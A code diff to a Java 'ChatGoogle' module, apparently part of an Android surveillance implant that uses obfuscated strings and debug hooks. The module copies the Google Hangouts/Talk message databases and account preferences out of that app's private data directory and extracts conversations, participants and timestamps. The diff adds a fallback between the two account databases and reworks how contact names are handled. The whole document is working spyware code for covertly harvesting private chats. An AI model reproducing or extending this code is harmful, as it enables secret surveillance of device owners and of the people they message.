@@ -72,7 +72,17 @@ public class ChatGoogle extends SubModuleChat {
 
 		long[] lastLines = markup.unserialize(new long[2]);
 
-		readHangoutMessages(lastLines);
+		String babel0 = M.e("babel0.db");
+		String babel1 = M.e("babel1.db");
+		
+		String account = readAccount("1.name");
+		if(StringUtils.isEmpty(account) || !readHangoutMessages(lastLines, babel1, account)){
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (readChatMessages) try babel0");
+			}
+			account = readAccount("0.name");
+			readHangoutMessages(lastLines, babel0, account);
+		}
 		readGoogleTalkMessages(lastLines);
 
 		serializeMarkup(lastLines);
@@ -91,11 +101,11 @@ public class ChatGoogle extends SubModuleChat {
 		}
 	}
 
-	private void readHangoutMessages(long[] lastLines) {
-		String dbFile = M.e("babel0.db");
+	private boolean readHangoutMessages(long[] lastLines, String dbFile, String account) {
+		
 		String dbDir = M.e("/data/data/com.google.android.talk/databases");
 
-		String account = readAccount();
+		
 		//if (ManagerModule.self().isInstancedAgent(ModuleAddressBook.class)) {
 		//	saveContacts(helper);
 		//}
@@ -104,6 +114,9 @@ public class ChatGoogle extends SubModuleChat {
 				M.e("join conversation_participants as cp on c.conversation_id=cp.conversation_id join participants as p on  cp.participant_row_id=p._id");
 		
 		GenericSqliteHelper helper = GenericSqliteHelper.openCopy(dbDir, dbFile);
+		if(helper == null){
+			return false;
+		}
 		helper.deleteAtEnd = false;
 		
 		ChatGroups groups = new ChatGroups();
@@ -130,7 +143,7 @@ public class ChatGoogle extends SubModuleChat {
 			lastLines[1] = newHangoutReadDate;
 		}
 		helper.deleteDb();
-
+		return true;
 	}
 
 	private long fetchHangoutMessages(GenericSqliteHelper helper, final HangoutConversation conversation, final ChatGroups groups, long lastTimestamp) {
@@ -155,8 +168,8 @@ public class ChatGoogle extends SubModuleChat {
 				String chat_id = cursor.getString(6);
 						
 				String peer = fullName;
-				if (fallback_name!=null)
-					peer = fallback_name;
+				//if (fallback_name!=null)
+				//	peer = fallback_name;
 
 				// localtime or gmt? should be converted to gmt
 				Date date = new Date(timestamp/1000);
@@ -235,8 +248,8 @@ public class ChatGoogle extends SubModuleChat {
 				Contact contact;
 
 				String email = fullname;
-				if(fallback!=null)
-					email = fallback;
+				if(email==null)
+					return 0;
 				
 				contact = new Contact(id, email, fullname, "");
 
@@ -285,7 +298,7 @@ public class ChatGoogle extends SubModuleChat {
 		
 	}
 
-	private String readAccount() {
+	private String readAccount(String nameField) {
 		String xmlDir = M.e("/data/data/com.google.android.talk/shared_prefs");
 		String xmlFile = M.e("accounts.xml");
 		
@@ -301,7 +314,8 @@ public class ChatGoogle extends SubModuleChat {
 				Node d = defaults.item(i);
 				NamedNodeMap attributes = d.getAttributes();
 				Node attr = attributes.getNamedItem("name");
-				if("0.name".equals(attr.getNodeValue())){
+				// nameField = "0.name"
+				if(nameField.equals(attr.getNodeValue())){
 					Node child = d.getFirstChild();
 					account = child.getNodeValue();
 					break;
